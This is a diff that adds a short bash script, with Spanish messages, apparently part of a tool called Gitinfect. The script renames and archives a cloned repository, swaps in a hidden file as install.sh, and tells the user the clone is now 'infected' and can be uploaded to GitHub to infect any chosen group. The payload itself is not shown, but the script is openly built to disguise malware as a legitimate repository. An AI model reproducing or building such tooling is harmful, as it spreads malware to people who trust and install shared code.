@@ -1,0 +1,18 @@
+bash .banner
+echo "Introduce el nombre del repositorio que clonaste:"
+echo ""
+ls
+echo ""
+read input
+mv $input Loostfind
+tar -cvf Loostfind.tar Loostfind/.*
+rm -fr Loostfind
+cp .i install.sh
+bash .banner
+echo "Ahora que tu git clone esta infectado podras subirlo"
+echo "a una cuenta github y desde ayi infectar al grupo que desees"
+echo "solo debes de subir los archivos install.sh y Loostfind.tar."
+echo ""
+echo "Preciona una tecla para continuar..."
+read input1
+bash Gitinfect.sh
